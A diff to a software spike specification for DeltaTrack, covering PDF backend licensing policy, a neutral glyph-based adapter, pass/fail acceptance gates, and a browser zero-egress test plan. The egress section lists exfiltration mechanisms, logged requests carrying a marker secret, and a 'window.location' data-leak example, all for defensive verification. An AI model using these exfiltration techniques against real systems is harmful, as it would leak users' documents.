@@ -30,17 +30,25 @@ The three outcomes the requester named, restated as decision consequences:
 
 ## Decide this before writing any code
 
-**DeltaTrack is Apache-2.0. PyMuPDF is AGPL-3.0.** Those are one-way compatible: Apache
-code can be absorbed into an AGPL work, not the reverse. Shipping PyMuPDF inside
-DeltaTrack would push the **distributed combination** to AGPL-3.0 and change this
-project's own licensing posture, for an audience (congressional offices, and BillTrax as
-a downstream consumer per ADR 0005) where that is a live adoption question rather than a
-formality. Artifex sells a commercial license, which is a cost and a procurement step.
+**DeltaTrack is Apache-2.0. PyMuPDF is AGPL-3.0**, and its own documentation states that
+users must either comply with the AGPL or obtain a commercial license from Artifex.
+
+This is stated as a **project distribution constraint, not a legal conclusion.** How
+licenses combine in a given distribution is a nuanced question, and this spike does not
+need to resolve it in order to run. The operative rule is simply:
+
+> **DeltaTrack will not ship dependencies requiring AGPL compliance, absent a separate
+> explicit licensing decision.** PyMuPDF is therefore benchmark-only.
+
+That framing is cleaner than a claim about what the combined work's license *would be*,
+and it is sufficient for every decision this spike makes. It also keeps the door open:
+the constraint is a project policy that the maintainer can revisit deliberately, or
+dissolve by buying a commercial license, rather than a legal fact to be litigated here.
 
 This is not a tie-breaker to apply after scoring. It changes what the bake-off is *for*:
 
-- **If AGPL is acceptable**, PyMuPDF is a candidate backend and can win outright.
-- **If AGPL is disqualifying**, PyMuPDF is still worth running, but as a **ceiling
+- **If the constraint is relaxed**, PyMuPDF is a candidate backend and can win outright.
+- **Under the constraint as written**, PyMuPDF is still worth running, but as a **ceiling
   reference**: it establishes the best score any backend could plausibly achieve, which
   is precisely what tells us whether a PDFium-WASM effort is worth funding. Label it
   that way in the results so nobody later reads a PyMuPDF win as a shippable
@@ -49,10 +57,9 @@ This is not a tie-breaker to apply after scoring. It changes what the bake-off i
 ### Answered, 2026-08-05: PyMuPDF is a ceiling reference, not a candidate
 
 **Decision: run PyMuPDF and score it in full, but treat it as an upper bound rather
-than a shippable backend.** AGPL-3.0 is disqualifying for what DeltaTrack ships,
-because the distributed combination would carry AGPL obligations into congressional
-offices and into BillTrax as a downstream consumer, against an existing Apache-2.0
-posture.
+than a shippable backend.** The project will not take on an AGPL-compliance obligation
+for what it distributes to congressional offices, or pass one to BillTrax as a
+downstream consumer (ADR 0005), without a separate explicit licensing decision.
 
 Two consequences for the session running this spike:
 
@@ -121,17 +128,70 @@ other ~15 (`normalize_raw`, `strip_page_chrome`, `rejoin_soft_hyphens`,
 `normalize_glyphs`, `parse_lines`, `_cluster_baselines`, `_line_text`,
 `_first_word_right`, `_attach_geometry`, …) are pure Python over already-extracted data.
 
-**Every backend must feed the same pure cleaning layer.** Define one adapter contract:
+### The seam must be glyph facts, not PDFium-shaped text
+
+An earlier draft of this spec had each backend emit `page_text` plus glyphs and feed the
+existing pure functions unchanged. **That was wrong, and it would have quietly graded
+every challenger against PDFium.** The pure functions are pure Python, but they are not
+backend-neutral. From `parsers/pdf_text.py` itself:
+
+- `normalize_raw`'s docstring opens: *"Rewrite **PDFium's** raw page text into the layout
+  the line-numbered cleaner expects."*
+- The module comments name *"**PDFium** soft-hyphen glyph (**U+FFFE**), emitted at a
+  syllable break and immediately [followed by the next margin number]"*, and *"**PDFium**
+  has no same-page continuation to emit after the U+FFFE, so it pulls whatever footer
+  [follows]"*.
+- It strips *"trailing spaces (which **PDFium** keeps on nearly every line)"*.
+
+So a challenger feeding `normalize_raw` would have to emit PDFium's U+FFFE soft-hyphen
+convention and PDFium's trailing-space behaviour to score well. That is the incumbent as
+reference, reintroduced through the back door, and it is exactly what using XML as the
+reference was meant to avoid.
+
+**The neutral seam is layout facts.** Define the contract as a backend-agnostic page
+model, and reconstruct text, visual lines, margin numbers and spacing *from it*:
 
 ```
-backend(pdf_bytes) -> for each page:
-    page_text : str
-    glyphs    : sequence of (bottom, left, right, codepoint, size, font_id)
+PdfPage
+  width, height
+  glyphs[]
+      unicode
+      bbox        (x0, y0, x1, y1)
+      baseline
+      font_size
+      font_id
 ```
 
-The first five fields are exactly what `_page_glyph_sizes` produces today. Each backend
-implements only this, and everything downstream is the existing, unmodified DeltaTrack
-code.
+Each backend produces only `PdfPage`. A **new, neutral reconstruction layer** turns
+`PdfPage` into the line/heading structures DeltaTrack consumes. Every backend is then
+graded on the quality of its glyph facts, not on how closely it imitates PDFium.
+
+The target architecture this implies:
+
+```
+PDFium   ─┐
+PDF.js   ─┼─>  PdfPage / glyphs  ─>  GPO interpretation  ─>  DeltaTrack structures
+pdfminer ─┘
+```
+
+rather than every backend pretending to be PDFium.
+
+**This stays inside the no-production-changes rule.** The neutral reconstruction lives in
+`probes/`. If it proves itself, extracting it from `parsers/pdf_text.py` becomes the
+follow-up PR, and that PR is a *finding of this spike*, not part of it.
+
+**Two consequences the running session must handle.**
+
+- The neutral reconstruction is new code, so a bug in it penalises every backend at once.
+  That is acceptable for *ranking* but not for the absolute pass/fail gates below, which
+  is why the calibration gate (Trap 1) becomes load-bearing rather than merely prudent:
+  **run PDFium's glyphs through the neutral layer and require near-ceiling scores before
+  trusting any other result.** If PDFium scores poorly through the neutral layer, the
+  layer is wrong, not PDFium.
+- Reconstructing text from glyphs discards whatever reading-order logic a backend's own
+  text API applies. That is deliberate (it is the bias being removed), but it means this
+  bake-off measures **glyph-fact quality**, not "text extraction quality" as a library
+  would advertise it. Say so in the results.
 
 **`font_id` is in the contract deliberately, even though the engine does not use it
 yet.** [`docs/source-signal-inventory.md`](../../source-signal-inventory.md) records
@@ -237,18 +297,91 @@ grounds regardless of accuracy, and that is worth learning in Phase 0 rather tha
   mistaken for coverage.
 - **pikepdf / pdf-lib.** Manipulation and creation libraries, not text extractors.
 
-## Scoping tension worth stating in the results
+## Acceptance: hard gates first, ranking only among survivors
 
-The XML-as-reference method only works where XML exists, and XML exists for
-**published** bills. But [ADR 0010](../../decisions/0010-pdf-pipeline-pre-publication.md)
-says the PDF pipeline exists for **pre-publication** documents: committee prints, chair's
-marks, discussion drafts, which have no XML and are not in the corpus.
+**Do not compute a weighted composite score.** DeltaTrack is an accuracy-sensitive
+document-comparison tool, and a weighted score lets a backend offset a missed
+appropriations amount with 200 ms of speed or slightly better heading recovery. That
+trade is never acceptable here.
 
-So this bake-off grades backends on precisely the documents where the PDF path matters
-least, and cannot grade them on the documents that motivate the path at all. That is
-inherent to the method, not a flaw in it, and the method is still the right one. But a
-winner here has been shown to handle **clean published GPO PDFs**, and the results must
-say so rather than claiming "PDF is solved."
+A backend **passes or fails**. Ranking applies only to backends that have passed.
+
+| # | Gate | Requirement |
+|---|---|---|
+| 1 | Opens the corpus | 52/52 documents, no crashes |
+| 2 | Line-number integrity | **At least incumbent quality** (a no-regression gate, see note) |
+| 3 | Structural conservation | No unexplained structural loss; the ADR 0014 conservation check holds |
+| 4 | Material diff correctness | **Zero** adjudicated material errors |
+| 5 | `amount_entries` | **Zero** adjudicated amount errors |
+| 6 | Browser execution | Runs in Pyodide or natively in-browser, not only in native Python |
+| 7 | Fully offline operation | No network resource required at any point |
+| 8 | Licensing | Satisfies the project distribution policy (below) |
+| 9 | Performance | Remains usable on the largest corpus documents |
+
+Only then rank survivors on speed, bundle size, adapter complexity and maintenance
+burden.
+
+**Note on gate 2.** "At least incumbent quality" is measured against **PDFium**, which
+partially reintroduces the incumbent as a reference. That is deliberate and correctly
+scoped: gate 2 is a *no-regression* gate (we must not ship worse than today), which is a
+different question from the *correctness* gates 3 to 5, which reference XML. Keep the two
+kinds of gate labelled distinctly in the results so they are not read as one number.
+
+**Define "material" before running.** Gates 4 and 5 are unfalsifiable without a
+pre-registered materiality threshold. Write it down in Phase 0.
+
+### Honest statistics on a 15-pair corpus
+
+"Zero material failures" is the right criterion, and it is far more interpretable than
+"98.7%". But state its power honestly, because **zero failures in 15 pairs is a weak
+bound**: by the rule of three, it is consistent with a true material-failure rate as high
+as roughly **20%** at 95% confidence.
+
+That is not an argument against the gate. It is an argument for (a) reporting the bound
+alongside the result, (b) not writing "PDF is solved" on the strength of 15 pairs, and
+(c) treating Tier B below as necessary rather than optional.
+
+## Two-tier acceptance: published vs. pre-publication
+
+The XML-as-reference method only works where XML exists, and XML exists for **published**
+bills. But [ADR 0010](../../decisions/0010-pdf-pipeline-pre-publication.md) says the PDF
+pipeline exists for **pre-publication** documents: committee prints, chair's marks,
+discussion drafts, which have no XML. This bake-off would otherwise grade backends on
+precisely the documents where the PDF path matters least.
+
+This is promoted from a caveat to a **formal two-tier result**.
+
+### Tier A: published GPO PDF correctness
+
+The 52-document / 15-pair corpus, with XML as reference. Exceptionally good comparative
+ground truth. All nine gates above apply.
+
+### Tier B: non-canonical / pre-publication robustness
+
+Committee prints, discussion drafts, chair's marks, oddly generated PDFs, missing GPO
+line numbers, altered typography. No XML truth, so it needs **manually adjudicated
+fixtures**. Even five to ten representative files would be highly informative.
+
+**Fixture sourcing is a real cost and the repository does not currently solve it.**
+Checked on 2026-08-05: `tests/data/subcommittee/` holds nine PDFs, but they are
+`BILLS-118hr…rh` documents, GPO-published House-reported prints, so they are additional
+Tier A print-class variety rather than Tier B. `tests/data/CRPT-118srpt198.pdf` (a
+watermarked committee report) and `tests/data/BILLS-118s4795rs.pdf` (a watermarked Senate
+bill) are the closest things present. **Genuine pre-publication fixtures do not exist in
+the repo and must be sourced.** Public committee prints (`CPRT-*` on govinfo) are the
+best available public proxy; real chair's marks and discussion drafts would need a
+congressional contact.
+
+### The conclusion each tier licenses
+
+| Evidence | Permitted conclusion |
+|---|---|
+| Tier A passes | "Browser PDF architecture is technically viable and matches current capabilities **on published GPO material**." Enough to justify continuing browser work. |
+| Tier A passes, Tier B absent | **Not** "PDF is solved." The spike must not write that sentence. |
+| Tier A passes, Tier B fails | "Backend X solves published GPO PDFs but fails generic legislative drafts." Far more informative than any percentage. |
+
+Phase 1 to 3 success **may not** produce a "PDF is solved" conclusion until Tier B
+exists.
 
 ## Corpus and N
 
@@ -352,6 +485,65 @@ guard works or the counter is broken. Required, all three:
    a font, an analytics ping) and prove the harness **catches it**. Without this, the
    zero-egress claim is unfalsifiable and worth nothing.
 
+### Prove the policy, not just our code's behaviour
+
+The three tests above establish *"our application did not make a request."* The property
+worth claiming is stronger: *"application code **cannot** transmit document data."* The
+difference matters to a security reviewer, because the first is a statement about today's
+code and the second is a statement about the architecture.
+
+So add an **adversarial fixture** that deliberately attempts every egress mechanism, and
+require the production browser policy to block them **independently of what our code
+happens to do**: `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`,
+`navigator.sendBeacon`, `<img src>`, remote `<script>`, remote CSS / `@import` / webfont,
+`<iframe src>`, dynamic `import()`, form submission, service-worker registration, and
+worker-originated requests.
+
+**Measured 2026-08-05 (Chrome 151, `file://`, `origin: null`)** with
+[`probes/vectors.js`](probes/vectors.js) against a logging server
+([`probes/serve.py`](probes/serve.py)). Two results that should shape the design:
+
+**1. `file://` provides no egress protection whatsoever.** Ten vectors reached a
+different origin carrying a marker string, with no CSP:
+
+```
+GET  /nocsp-fetch?secret=BILLTEXT        GET  /nocsp-css?secret=BILLTEXT
+GET  /nocsp-xhr?secret=BILLTEXT          GET  /nocsp-script?secret=BILLTEXT
+POST /nocsp-beacon?secret=BILLTEXT       GET  /nocsp-iframe?secret=BILLTEXT
+GET  /nocsp-img?secret=BILLTEXT          GET  /nocsp-eventsource?secret=BILLTEXT
+GET  /nocsp-dynimport?secret=BILLTEXT    GET  /nocsp-ws
+```
+
+**CORS is not an egress control.** It gates reading the *response*, not sending the
+*request*, so `origin: null` blocks nothing that matters here. Any security story that
+leans on "it runs from a local file" is unfounded.
+
+**2. A strict CSP blocked all ten.** With
+`default-src 'none'; connect-src 'none'; form-action 'none'; base-uri 'none'; object-src 'none'`
+in a `<meta http-equiv>` tag, **zero** requests reached the server. This is the control
+that actually earns the claim, and it is cheap: one meta tag in the artifact.
+
+**3. The harness must observe at the network layer, not the JS layer.** Under CSP most
+vectors still reported `attempted` with **no JavaScript exception**; they simply produced
+no request. A probe that checked for thrown errors would have reported exfiltration as
+*succeeding*. Assert on what the server received.
+
+**Two vectors this harness did not conclusively test**, recorded so they are not read as
+blocked: **form submission** (the fixture builds a form but never calls `submit()`) and
+**WebRTC** (the logging server speaks HTTP, not STUN, so a STUN attempt would not appear
+regardless). Close both in the spike.
+
+**State the residual limit rather than overclaiming.** Top-level navigation exfiltration
+(`window.location = "https://host/?data=…"`) is not covered by any current CSP directive,
+since `navigate-to` was removed from the specification. It is also user-visible, because
+the page would disappear. The defensible claim is therefore:
+
+> DeltaTrack document processing executes under a browser policy that requires no network
+> resources, permits no subresource or background network egress, and is continuously
+> tested against deliberate exfiltration attempts across every mechanism CSP governs.
+
+That is strong for an IT review, and it is true. "Exfiltration is impossible" is not.
+
 Also record temp-file and persistence behaviour, since ADR 0005's safety contract is
 about persistence and ADR 0011's is about transmission, and they are different axes.
 
@@ -387,6 +579,44 @@ posture and on BillTrax as a downstream consumer.
 - If a phase's result makes a later phase pointless, stop and say so.
 
 ---
+
+## The question this spike answers
+
+Not "which is the best browser PDF backend." That framing invites a weighted score and a
+winner nobody can act on. The question is:
+
+> **Is there a permissively licensed PDF backend that produces staffer-trustworthy
+> DeltaTrack diffs entirely inside a browser, and can we execute it in an environment
+> with enforced zero network egress?**
+
+If yes, the delivery research becomes considerably more compelling: Pyodide plus a
+suitable PDF backend plus a locked-down browser artifact puts essentially the whole
+DeltaTrack engine on the staffer's machine, with no install and a security story that can
+be **demonstrated** rather than asserted.
+
+### The decision tree this produces
+
+```
+                     Browser PDF bake-off
+                            │
+            ┌───────────────┴────────────────┐
+            │                                │
+   shippable backend passes          nothing passes
+            │                                │
+            ▼                                ▼
+     Browser architecture           Browser cannot yet be
+       remains viable                 primary delivery
+            │                        (packaged executable
+     ┌──────┴──────┐                  for the PDF path)
+     │             │
+ pdfminer/PDF.js   PDFium-WASM
+    passes           needed
+     │                │
+     ▼                ▼
+ simple path    engineering justified
+```
+
+PyMuPDF shows what the achievable ceiling looks like, and never enters this tree.
 
 ## What a result looks like
 
